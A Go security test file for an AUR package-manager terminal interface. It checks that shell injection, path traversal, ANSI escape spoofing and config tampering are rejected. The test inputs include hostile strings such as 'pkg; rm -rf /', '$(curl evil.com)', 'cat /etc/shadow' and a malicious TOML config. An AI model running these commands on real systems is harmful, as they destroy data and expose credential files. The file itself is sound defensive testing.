package main

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

// ══════════════════════════════════════════════════════════════════════════════
// Test Infrastructure
// ══════════════════════════════════════════════════════════════════════════════

// mockRunner for capturing interactive command arguments
type mockRunner struct {
	RealCommandRunner
	capturedArgs  []string
	capturedCalls [][]string // Track multiple calls
}

func (m *mockRunner) Interactive(onExit func(error) tea.Msg, name string, args ...string) tea.Cmd {
	m.capturedArgs = append([]string{name}, args...)
	m.capturedCalls = append(m.capturedCalls, m.capturedArgs)
	return func() tea.Msg { return nil }
}

func (m *mockRunner) Run(name string, args ...string) ([]byte, error) {
	m.capturedArgs = append([]string{name}, args...)
	m.capturedCalls = append(m.capturedCalls, m.capturedArgs)
	return []byte{}, nil
}

func (m *mockRunner) RunContext(ctx context.Context, name string, args ...string) ([]byte, error) {
	return m.Run(name, args...)
}

func (m *mockRunner) RunWithInput(input string, name string, args ...string) ([]byte, error) {
	m.capturedArgs = append([]string{name}, args...)
	m.capturedCalls = append(m.capturedCalls, m.capturedArgs)
	return []byte{}, nil
}

func (m *mockRunner) RunWithInputContext(ctx context.Context, input string, name string, args ...string) ([]byte, error) {
	return m.RunWithInput(input, name, args...)
}

// ══════════════════════════════════════════════════════════════════════════════
// 1. COMMAND INJECTION TESTS
// ══════════════════════════════════════════════════════════════════════════════

func TestCommandInjection(t *testing.T) {
	// Save and restore runner
	oldRunner := runner
	defer func() { runner = oldRunner }()

	t.Run("PackageName_ShellMetachars_Rejected", func(t *testing.T) {
		// Test various shell injection attempts in package names
		maliciousNames := []string{
			"pkg; rm -rf /",
			"pkg$(whoami)",
			"pkg`id`",
			"pkg|cat /etc/passwd",
			"pkg && malicious",
			"pkg\nmalicious",
			"pkg\rmalicious",
			"pkg > /etc/passwd",
			"pkg < /dev/null",
			"$(curl evil.com)",
			"pkg${IFS}injection",
			"pkg'injection",
			"pkg\"injection",
			"../../etc/passwd",
			"pkg;$(id)",
		}

		for _, name := range maliciousNames {
			if isValidPackageName(name) {
				t.Errorf("isValidPackageName should reject %q but accepted it", name)
			}
		}
	})

	t.Run("PackageName_ValidChars_Accepted", func(t *testing.T) {
		// Ensure legitimate package names still work
		validNames := []string{
			"vim",
			"neovim-git",
			"linux-zen",
			"python-numpy",
			"lib32-mesa",
			"ttf-ms-fonts",
			"package_name",
			"package.name",
			"package+extra",
			"package@version",
			"UPPERCASE",
			"MixedCase123",
		}

		for _, name := range validNames {
			if !isValidPackageName(name) {
				t.Errorf("isValidPackageName should accept %q but rejected it", name)
			}
		}
	})

	t.Run("SanitizePackageNames_FiltersInjection", func(t *testing.T) {
		input := []string{
			"legitimate-pkg",
			"pkg; rm -rf /",
			"another-valid",
			"$(malicious)",
			"safe-package",
		}

		valid, allValid := sanitizePackageNames(input)

		if allValid {
			t.Error("sanitizePackageNames should report not all names are valid")
		}

		if len(valid) != 3 {
			t.Errorf("Expected 3 valid names, got %d: %v", len(valid), valid)
		}

		for _, name := range valid {
			if !isValidPackageName(name) {
				t.Errorf("sanitizePackageNames returned invalid name: %q", name)
			}
		}
	})

	t.Run("BuildAURCommand_NoShellInterpolation", func(t *testing.T) {
		cfg := &Config{
			Commands: CommandConfig{
				AurHelper:    "paru",
				InstallFlags: "--noconfirm --needed",
			},
		}

		// Even with flags, command should be built as array, not shell string
		cmd := BuildAURCommand(cfg, "install", "test-package")

		// Verify no element contains shell metacharacters that would be dangerous
		for _, arg := range cmd {
			if strings.Contains(arg, ";") || strings.Contains(arg, "|") {
				t.Errorf("BuildAURCommand output contains dangerous char: %q", arg)
			}
		}

		// Verify flags are properly tokenized (not as single string)
		foundNoconfirm := false
		foundNeeded := false
		for _, arg := range cmd {
			if arg == "--noconfirm" {
				foundNoconfirm = true
			}
			if arg == "--needed" {
				foundNeeded = true
			}
		}
		if !foundNoconfirm || !foundNeeded {
			t.Errorf("Flags not properly tokenized: %v", cmd)
		}
	})

	t.Run("ExecuteInstallInTerminal_RejectsInjection", func(t *testing.T) {
		mRunner := &mockRunner{}
		runner = mRunner

		m := &model{
			config: Config{
				Commands: CommandConfig{
					AurHelper: "paru",
				},
			},
		}

		// Attempt injection via package name
		packages := []string{"pkg; rm -rf /", "legitimate-pkg"}
		cmd := executeInstallInTerminal(m, packages)

		if cmd != nil {
			cmd() // Execute to trigger mock
		}

		// Verify only legitimate package was passed
		for _, arg := range mRunner.capturedArgs {
			if strings.Contains(arg, ";") || strings.Contains(arg, "rm -rf") {
				t.Errorf("Injection attempt passed through: %q", arg)
			}
		}
	})

	t.Run("ExecuteRemoveInTerminal_RejectsInjection", func(t *testing.T) {
		mRunner := &mockRunner{}
		runner = mRunner

		m := &model{
			config: Config{
				Commands: CommandConfig{
					AurHelper: "paru",
				},
			},
		}

		packages := []string{"$(whoami)", "valid-pkg", "`id`"}
		cmd := executeRemoveInTerminal(m, packages)

		if cmd != nil {
			cmd()
		}

		for _, arg := range mRunner.capturedArgs {
			if strings.Contains(arg, "$") || strings.Contains(arg, "`") {
				t.Errorf("Injection attempt passed through: %q", arg)
			}
		}
	})

	t.Run("SearchQuery_Sanitization", func(t *testing.T) {
		// The search sanitization in searchAUR should strip dangerous chars
		maliciousQueries := []string{
			"pkg; rm -rf /",
			"test$(id)",
			"search`whoami`",
			"query|cat",
		}

		for _, query := range maliciousQueries {
			// Simulate the sanitization logic from searchAUR
			var sanitized strings.Builder
			for _, r := range query {
				if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') ||
					(r >= '0' && r <= '9') || r == '-' || r == '_' || r == '.' {
					sanitized.WriteRune(r)
				} else if r == ' ' {
					sanitized.WriteRune('-')
				}
			}
			result := sanitized.String()

			// Verify no dangerous chars remain
			if strings.ContainsAny(result, ";$`|&<>(){}") {
				t.Errorf("Sanitization failed for %q, got %q", query, result)
			}
		}
	})
}

// ══════════════════════════════════════════════════════════════════════════════
// 2. PRIVILEGE ESCALATION & FLAG INJECTION TESTS
// ══════════════════════════════════════════════════════════════════════════════

func TestPrivilegeEscalation(t *testing.T) {
	oldRunner := runner
	defer func() { runner = oldRunner }()

	t.Run("InstallFlags_NoArbitraryExecution", func(t *testing.T) {
		// Attacker tries to inject flags that could lead to code execution
		dangerousFlags := []string{
			"--help; rm -rf /",
			"--config=/etc/passwd",
			"-U /tmp/malicious.pkg.tar.zst", // Local package install
		}

		for _, flags := range dangerousFlags {
			cfg := &Config{
				Commands: CommandConfig{
					AurHelper:    "paru",
					InstallFlags: flags,
				},
			}

			cmd := BuildAURCommand(cfg, "install", "test-pkg")

			// Check that semicolons don't create new commands
			fullCmd := strings.Join(cmd, " ")
			if strings.Count(fullCmd, ";") > 0 {
				// The semicolon should be part of an argument, not command separation
				// In exec.Command, this is safe because args are passed directly
				t.Logf("Note: semicolon in flags %q - safe in exec.Command context", flags)
			}
		}
	})

	t.Run("RemoveFlags_NoEscalation", func(t *testing.T) {
		// Prevent removal of critical system packages via flag injection
		cfg := &Config{
			Commands: CommandConfig{
				AurHelper:   "paru",
				RemoveFlags: "-Rdd --noconfirm", // Dangerous: skips dependency checks
			},
		}

		cmd := BuildAURCommand(cfg, "remove", "test-pkg")

		// Verify the command structure
		if len(cmd) < 2 {
			t.Fatalf("Command too short: %v", cmd)
		}

		// The flags should be properly tokenized, not executed as shell
		foundHelper := cmd[0] == "paru"
		if !foundHelper {
			t.Errorf("First argument should be helper, got %q", cmd[0])
		}
	})

	t.Run("AurHelper_OnlyAllowedValues", func(t *testing.T) {
		tests := []struct {
			input    string
			expected string
		}{
			{"paru", "paru"},
			{"yay", "yay"},
			{"PARU", "paru"},            // Should normalize
			{"YAY", "yay"},              // Should normalize
			{"pacman", "paru"},          // Not allowed, reset to default
			{"rm", "paru"},              // Obvious attack
			{"/bin/bash", "paru"},       // Path injection
			{"paru; rm -rf /", "paru"},  // Command injection attempt
			{"", "paru"},                // Empty
			{"  paru  ", "paru"},        // Whitespace
			{"../../../bin/sh", "paru"}, // Path traversal
		}

		for _, tt := range tests {
			cfg := &Config{
				Commands: CommandConfig{
					AurHelper: tt.input,
				},
			}
			ValidateConfig(cfg)

			if cfg.Commands.AurHelper != tt.expected {
				t.Errorf("AurHelper %q: expected %q, got %q", tt.input, tt.expected, cfg.Commands.AurHelper)
			}
		}
	})

	t.Run("CacheTool_OnlyAllowedValues", func(t *testing.T) {
		tests := []struct {
			input    string
			expected string
		}{
			{"paccache", "paccache"},
			{"rm -rf /", "paccache"},
			{"/bin/bash", "paccache"},
			{"", "paccache"},             // Empty defaults to paccache
			{"  paccache  ", "paccache"}, // Whitespace trimmed
		}

		for _, tt := range tests {
			cfg := &Config{
				Commands: CommandConfig{
					CacheTool: tt.input,
				},
			}
			ValidateConfig(cfg)

			if cfg.Commands.CacheTool != tt.expected {
				t.Errorf("CacheTool %q: expected %q, got %q", tt.input, tt.expected, cfg.Commands.CacheTool)
			}
		}
	})

	t.Run("ExecuteCleanCache_NoArbitraryCommands", func(t *testing.T) {
		mRunner := &mockRunner{}
		runner = mRunner

		m := &model{
			config: Config{
				Commands: CommandConfig{
					CacheTool: "rm -rf /", // Attacker tries to set malicious tool
				},
			},
		}

		// ValidateConfig should have reset this, but let's verify the execution path
		ValidateConfig(&m.config)

		cmd := executeCleanCache(m, confirmCleanKeep3, 3, false)
		if cmd != nil {
			cmd()
		}

		// Should use paccache, not the injected command
		if len(mRunner.capturedArgs) > 0 && mRunner.capturedArgs[0] != "sudo" {
			t.Errorf("Expected sudo, got %q", mRunner.capturedArgs[0])
		}
		if len(mRunner.capturedArgs) > 1 && mRunner.capturedArgs[1] != "paccache" {
			t.Errorf("Expected paccache after sudo, got %v", mRunner.capturedArgs)
		}
	})
}

// ══════════════════════════════════════════════════════════════════════════════
// 3. TUI SPOOFING VIA MALICIOUS EXTERNAL DATA TESTS
// ══════════════════════════════════════════════════════════════════════════════

func TestTUISpoofing(t *testing.T) {
	t.Run("PackageDescription_ANSIEscapeStripping", func(t *testing.T) {
		// Malicious package descriptions could contain ANSI escape codes
		// to manipulate the terminal display
		maliciousDescriptions := []string{
			"\x1b[2J\x1b[H",                       // Clear screen, home cursor
			"\x1b]0;HACKED\x07",                   // Set window title
			"\x1b[31mFake Error\x1b[0m",           // Colored text
			"\x1b[?25l",                           // Hide cursor
			"\x1b[1;1H\x1b[2J",                    // Clear and home
			"\x1b[1A\x1b[2K",                      // Move up, clear line
			"\x1b[s\x1b[999;999H\x1b[u",           // Save/restore position
			"Normal text\x1b[999D\x1b[KMalicious", // Overwrite previous content
			"\x1b[?1049h",                         // Switch to alternate screen
			"\x1b[0;0r\x1b[999;999H",              // Set scroll region
		}

		for _, desc := range maliciousDescriptions {
			pkg := Package{
				Name:        "test-pkg",
				Description: sanitizeUntrusted(desc),
			}

			if strings.IndexByte(pkg.Description, 0x1b) >= 0 {
				t.Errorf("sanitizeUntrusted failed to strip ESC from: %q, got: %q", desc, pkg.Description)
			}

			// truncateWithAnsi should handle/preserve ANSI but not allow escape sequences
			// to affect rendering outside the designated area
			truncated := truncateWithAnsi(pkg.Description, 80)

			// The function preserves ANSI for styling, but UI should be constrained
			// Check that output width is bounded and clean of raw non-SGR escapes
			if lipgloss.Width(truncated) > 80 {
				t.Errorf("truncateWithAnsi failed to constrain width for: %q", desc)
			}
			clean := stripSGR(truncated)
			if strings.IndexByte(clean, 0x1b) >= 0 {
				t.Errorf("truncateWithAnsi preserved raw non-SGR ESC for: %q (got %q)", desc, clean)
			}
		}
	})

	t.Run("PackageName_NoControlChars", func(t *testing.T) {
		// Package names with control characters should be rejected
		controlCharNames := []string{
			"pkg\x00null",      // Null byte
			"pkg\x08backspace", // Backspace
			"pkg\x1bESC",       // Escape
			"pkg\x7fDEL",       // Delete
			"pkg\ttab",         // Tab
			"pkg\nnewline",     // Newline
			"pkg\rcarriage",    // Carriage return
		}

		for _, name := range controlCharNames {
			if isValidPackageName(name) {
				t.Errorf("isValidPackageName should reject control chars in %q", name)
			}
		}
	})

	t.Run("PackageName_LeadingDashAndDots", func(t *testing.T) {
		// Names starting with '-' or '.' or standalone symbols must be rejected (S-05)
		hostileNames := []string{
			"-Syu",
			"--remove",
			"-Rns",
			"--noconfirm",
			".",
			"..",
			"-",
			".hidden",
			"-invalid",
		}
		for _, name := range hostileNames {
			if isValidPackageName(name) {
				t.Errorf("isValidPackageName should reject hostile/leading-dash name %q", name)
			}
		}

		// Legitimate packages with embedded dots must remain valid (S-05)
		legitNames := []string{
			"vim",
			"glibc",
			"lib32-foo",
			"@world",
			"db5.3",
			"ffmpeg4.4",
			"litehtml0.9",
			"python-jaraco.classes",
			"vid.stab",
			"aspnet-runtime-9.0",
		}
		for _, name := range legitNames {
			if !isValidPackageName(name) {
				t.Errorf("isValidPackageName should accept legitimate package %q", name)
			}
		}
	})

	t.Run("PackageVersion_TruncationSafe", func(t *testing.T) {
		// Extremely long versions should be safely truncated
		longVersion := strings.Repeat("1.0.", 1000) + "final"

		pkg := Package{
			Name:    "test-pkg",
			Version: longVersion,
		}

		// Truncation should work without panic
		truncated := truncateWithAnsi(pkg.Version, 20)
		if lipgloss.Width(truncated) > 20 {
			t.Errorf("Version truncation failed, width = %d", lipgloss.Width(truncated))
		}
	})

	t.Run("SourceRepository_Validated", func(t *testing.T) {
		// Only known repository sources should be colored
		// Unknown sources should not cause issues
		sources := []string{
			"core",
			"extra",
			"multilib",
			"aur",
			"unknown",
			"<script>alert(1)</script>",
			"\x1b[31mmalicious\x1b[0m",
			"../../../etc",
		}

		for _, source := range sources {
			pkg := Package{
				Source: source,
				Name:   "test-pkg",
			}

			// sourceStyle should handle unknown sources gracefully
			style := sourceStyle(pkg.Source)
			rendered := style.Render(pkg.Source)

			// Should not panic and should produce some output
			if rendered == "" {
				t.Errorf("sourceStyle returned empty for source %q", source)
			}
		}
	})

	t.Run("FitToBox_BoundsChecking", func(t *testing.T) {
		testCases := []struct {
			input  string
			width  int
			height int
		}{
			{"test", 0, 0},                      // Zero dimensions
			{"test", -1, -1},                    // Negative dimensions
			{"test", 1000000, 1000000},          // Huge dimensions
			{strings.Repeat("x", 10000), 10, 5}, // Large input, small box
			{"", 10, 10},                        // Empty input
			{"line1\nline2\nline3", 5, 1},       // Multi-line, small height
		}

		for _, tc := range testCases {
			// Should not panic
			result := fitToBox(tc.input, tc.width, tc.height)

			// Width should be bounded (if width > 0)
			if tc.width > 0 && lipgloss.Width(result) > tc.width {
				t.Errorf("fitToBox exceeded width: got %d, max %d", lipgloss.Width(result), tc.width)
			}
		}
	})
}

// ══════════════════════════════════════════════════════════════════════════════
// 4. CONFIGURATION AND CACHE HIJACKING TESTS
// ══════════════════════════════════════════════════════════════════════════════

func TestConfigurationHijacking(t *testing.T) {
	t.Run("CacheDir_PathTraversal", func(t *testing.T) {
		tests := []struct {
			input    string
			expected string
		}{
			{"/tmp/gaur/../../../etc/passwd", ""}, // Outside allowed cache roots -> rejected
			{"/var/cache-evil", ""},               // Outside allowed cache roots -> rejected
			{"/etc", ""},                          // Outside allowed cache roots -> rejected
			{"./relative/path", ""},               // Relative should be rejected
			{"../escape/attempt", ""},             // Relative should be rejected
			{"", ""},                              // Empty is OK
			{"/var/cache/pacman/pkg", "/var/cache/pacman/pkg"},
			{"/var/cache/pacman/pkg/./subdir", "/var/cache/pacman/pkg/subdir"}, // Cleaned
		}

		for _, tt := range tests {
			cfg := &Config{
				Advanced: AdvancedConfig{
					CacheDir: tt.input,
				},
			}
			ValidateConfig(cfg)

			if cfg.Advanced.CacheDir != tt.expected {
				t.Errorf("CacheDir %q: expected %q, got %q", tt.input, tt.expected, cfg.Advanced.CacheDir)
			}
		}
	})

	t.Run("ConfigFile_Permissions", func(t *testing.T) {
		tmpDir, err := os.MkdirTemp("", "gaur-security-test-*")
		if err != nil {
			t.Fatal(err)
		}
		defer os.RemoveAll(tmpDir)

		configPath := filepath.Join(tmpDir, "config.toml")
		cfg := DefaultConfig()

		err = saveConfig(configPath, cfg)
		if err != nil {
			t.Fatalf("saveConfig failed: %v", err)
		}

		info, err := os.Stat(configPath)
		if err != nil {
			t.Fatal(err)
		}

		mode := info.Mode().Perm()
		if mode != 0600 {
			t.Errorf("Config file permissions: expected 0600, got %o", mode)
		}
	})

	t.Run("ConfigFile_DirectoryPermissions", func(t *testing.T) {
		// Verify that config directory creation uses appropriate permissions
		tmpDir, err := os.MkdirTemp("", "gaur-security-test-*")
		if err != nil {
			t.Fatal(err)
		}
		defer os.RemoveAll(tmpDir)

		newDir := filepath.Join(tmpDir, "gaur-config")
		err = os.MkdirAll(newDir, 0755)
		if err != nil {
			t.Fatal(err)
		}

		info, err := os.Stat(newDir)
		if err != nil {
			t.Fatal(err)
		}

		mode := info.Mode().Perm()
		// 0755 is acceptable for directories (need exec bit for traversal)
		if mode != 0755 {
			t.Logf("Directory permissions: %o (0755 expected)", mode)
		}
	})

	t.Run("SymlinkAttack_ConfigFile", func(t *testing.T) {
		tmpDir, err := os.MkdirTemp("", "gaur-security-test-*")
		if err != nil {
			t.Fatal(err)
		}
		defer os.RemoveAll(tmpDir)

		// Create a target file that attacker wants to overwrite
		targetFile := filepath.Join(tmpDir, "target.txt")
		err = os.WriteFile(targetFile, []byte("original content"), 0644)
		if err != nil {
			t.Fatal(err)
		}

		// Create symlink where config would be
		configPath := filepath.Join(tmpDir, "config.toml")
		err = os.Symlink(targetFile, configPath)
		if err != nil {
			t.Fatal(err)
		}

		// Attempt to save config through symlink
		cfg := DefaultConfig()
		err = saveConfig(configPath, cfg)

		// This will follow the symlink - this is a known consideration
		// In production, the config directory should be secured
		if err != nil {
			t.Logf("saveConfig through symlink returned error (may be expected): %v", err)
		}

		// Check if target was overwritten
		content, _ := os.ReadFile(targetFile)
		if string(content) != "original content" {
			t.Log("Note: symlink was followed - ensure config directory is secure")
		}
	})

	t.Run("CacheDir_SpecialPaths", func(t *testing.T) {
		specialPaths := []string{
			"/dev/null",
			"/proc/self/cwd",
			"/sys/kernel",
			"//double//slashes",
			"/tmp/space in path",
			"/tmp/unicode\u202e",
		}

		for _, path := range specialPaths {
			cfg := &Config{
				Advanced: AdvancedConfig{
					CacheDir: path,
				},
			}
			ValidateConfig(cfg)

			// Should either clean the path or reject it
			if cfg.Advanced.CacheDir != "" && !filepath.IsAbs(cfg.Advanced.CacheDir) {
				t.Errorf("CacheDir %q resulted in non-absolute: %q", path, cfg.Advanced.CacheDir)
			}
		}
	})

	t.Run("TOMLInjection", func(t *testing.T) {
		// Test that malicious TOML doesn't cause issues
		tmpDir, err := os.MkdirTemp("", "gaur-security-test-*")
		if err != nil {
			t.Fatal(err)
		}
		defer os.RemoveAll(tmpDir)

		// Write malicious TOML content
		maliciousTOML := `
[commands]
aur_helper = "paru\"; rm -rf /"
install_flags = "--noconfirm\" && curl evil.com"

[advanced]
cache_dir = "/tmp/$(whoami)"
`
		configPath := filepath.Join(tmpDir, "config.toml")
		err = os.WriteFile(configPath, []byte(maliciousTOML), 0600)
		if err != nil {
			t.Fatal(err)
		}

		// Try to read the config
		data, err := os.ReadFile(configPath)
		if err != nil {
			t.Fatal(err)
		}

		var cfg Config
		// This should parse but the values will be sanitized
		// The TOML parser will see the quotes as part of the string literal
		_ = data // Simulating the load

		// After validation, dangerous values should be sanitized
		cfg.Commands.AurHelper = "paru\"; rm -rf /"
		ValidateConfig(&cfg)

		if cfg.Commands.AurHelper != "paru" {
			t.Errorf("TOML injection not sanitized: %q", cfg.Commands.AurHelper)
		}
	})
}

// ══════════════════════════════════════════════════════════════════════════════
// 5. ADDITIONAL SECURITY EDGE CASES
// ══════════════════════════════════════════════════════════════════════════════

func TestSecurityEdgeCases(t *testing.T) {
	t.Run("EmptyPackageList_NoExecution", func(t *testing.T) {
		oldRunner := runner
		defer func() { runner = oldRunner }()

		mRunner := &mockRunner{}
		runner = mRunner

		m := &model{
			config: Config{
				Commands: CommandConfig{
					AurHelper: "paru",
				},
			},
		}

		// Empty package list should not execute
		cmd := executeInstallInTerminal(m, []string{})
		if cmd != nil {
			msg := cmd()
			// Should return error message, not execute
			if _, ok := msg.(execCompleteMsg); ok {
				if len(mRunner.capturedCalls) > 0 {
					t.Error("Empty package list caused command execution")
				}
			}
		}
	})

	t.Run("AllInvalidPackages_NoExecution", func(t *testing.T) {
		oldRunner := runner
		defer func() { runner = oldRunner }()

		mRunner := &mockRunner{}
		runner = mRunner

		m := &model{
			config: Config{
				Commands: CommandConfig{
					AurHelper: "paru",
				},
			},
		}

		// All malicious names should result in no execution
		packages := []string{"$(rm -rf /)", "; cat /etc/shadow", "`whoami`"}
		cmd := executeInstallInTerminal(m, packages)
		if cmd != nil {
			cmd()
		}

		// No interactive command should have been called
		if len(mRunner.capturedCalls) > 0 {
			for _, call := range mRunner.capturedCalls {
				// Should not contain any package args since all were invalid
				for _, arg := range call[1:] { // Skip command name
					if strings.Contains(arg, "$") || strings.Contains(arg, ";") || strings.Contains(arg, "`") {
						t.Errorf("Invalid package passed to execution: %v", call)
					}
				}
			}
		}
	})

	t.Run("UnicodeNormalization_PackageNames", func(t *testing.T) {
		// Unicode lookalike attacks
		lookalikes := []string{
			"pаru",       // Cyrillic 'а' instead of Latin 'a'
			"ｐaru",       // Fullwidth 'p'
			"par\u200Bu", // Zero-width space
			"par\u00ADu", // Soft hyphen
		}

		for _, name := range lookalikes {
			if isValidPackageName(name) {
				t.Errorf("Unicode lookalike should be rejected: %q (bytes: %x)", name, []byte(name))
			}
		}
	})

	t.Run("ExtremelyLongInput", func(t *testing.T) {
		// Test for buffer issues with extremely long input
		longName := strings.Repeat("a", 100000)

		// Should not panic
		result := isValidPackageName(longName)
		if !result {
			t.Log("Very long name rejected (expected)")
		}

		// Sanitization should handle it
		names, _ := sanitizePackageNames([]string{longName})
		if len(names) > 0 && len(names[0]) > 100000 {
			t.Error("Sanitization should handle very long input")
		}

		// Test null bytes in package names
		nullByteInputs := []string{
			"pkg\x00name",
			"\x00package",
			"package\x00",
		}

		for _, input := range nullByteInputs {
			if isValidPackageName(input) {
				t.Errorf("Null byte in package name should be rejected: %q", input)
			}
		}
	})

	t.Run("OverlayOnBase_Bounds", func(t *testing.T) {
		// Test overlay compositing with edge cases
		testCases := []struct {
			base       string
			overlay    string
			baseWidth  int
			baseHeight int
		}{
			{"base", "overlay", 0, 0},
			{"base", "", 10, 10},
			{"", "overlay", 10, 10},
			{"base\nbase", "over", 10, 1},
			{strings.Repeat("x", 1000), strings.Repeat("y", 2000), 50, 10},
		}

		for i, tc := range testCases {
			// Should not panic
			func() {
				defer func() {
					if r := recover(); r != nil {
						t.Errorf("Case %d panicked: %v", i, r)
					}
				}()
				_ = overlayOnBase(tc.base, tc.overlay, tc.baseWidth, tc.baseHeight)
			}()
		}
	})
}

// ══════════════════════════════════════════════════════════════════════════════
// LEGACY TESTS (kept for backward compatibility)
// ══════════════════════════════════════════════════════════════════════════════

func TestSecurityFixes(t *testing.T) {
	t.Run("ValidateConfig_CacheTool", func(t *testing.T) {
		cfg := &Config{
			Commands: CommandConfig{
				CacheTool: "rm -rf /",
			},
		}
		ValidateConfig(cfg)
		if cfg.Commands.CacheTool != "paccache" {
			t.Errorf("Expected CacheTool to be reset to 'paccache', got %q", cfg.Commands.CacheTool)
		}
	})

	t.Run("ValidateConfig_CacheDir_Normalization", func(t *testing.T) {
		cfg := &Config{
			Advanced: AdvancedConfig{
				CacheDir: "/var/cache/pacman/pkg/../pkg",
			},
		}
		ValidateConfig(cfg)
		expected := filepath.Clean("/var/cache/pacman/pkg/../pkg")
		if cfg.Advanced.CacheDir != expected {
			t.Errorf("Expected CacheDir to be normalized to %q, got %q", expected, cfg.Advanced.CacheDir)
		}
	})

	t.Run("FilePermissions_SaveConfig", func(t *testing.T) {
		tmpDir, err := os.MkdirTemp("", "gaur-security-test-*")
		if err != nil {
			t.Fatal(err)
		}
		defer os.RemoveAll(tmpDir)

		configPath := filepath.Join(tmpDir, "config.toml")
		cfg := DefaultConfig()

		err = saveConfig(configPath, cfg)
		if err != nil {
			t.Fatalf("saveConfig failed: %v", err)
		}

		info, err := os.Stat(configPath)
		if err != nil {
			t.Fatal(err)
		}

		mode := info.Mode().Perm()
		if mode != 0600 {
			t.Errorf("Expected config file permissions 0600, got %o", mode)
		}
	})

	t.Run("ExecuteCleanCache_NoInterpolation", func(t *testing.T) {
		oldRunner := runner
		mRunner := &mockRunner{}
		runner = mRunner
		defer func() { runner = oldRunner }()

		m := &model{
			config: Config{
				Commands: CommandConfig{
					CacheTool: "paccache",
				},
				Advanced: AdvancedConfig{
					CacheDir: "/tmp/malicious; rm -rf /",
				},
			},
		}

		cmd := executeCleanCache(m, confirmCleanKeep3, 3, false)
		if cmd == nil {
			t.Fatal("executeCleanCache returned nil command")
		}
		cmd()

		if len(mRunner.capturedArgs) < 2 {
			t.Fatalf("Expected at least 2 arguments for sudo, got %v", mRunner.capturedArgs)
		}

		if mRunner.capturedArgs[0] != "sudo" {
			t.Errorf("Expected first arg to be sudo, got %q", mRunner.capturedArgs[0])
		}

		if mRunner.capturedArgs[1] != "paccache" {
			t.Errorf("Expected second arg to be paccache, got %q", mRunner.capturedArgs[1])
		}

		for _, arg := range mRunner.capturedArgs {
			if strings.Contains(arg, ";") || strings.Contains(arg, "rm -rf") {
				t.Errorf("Found suspicious string in arguments: %q", arg)
			}
		}
	})
}
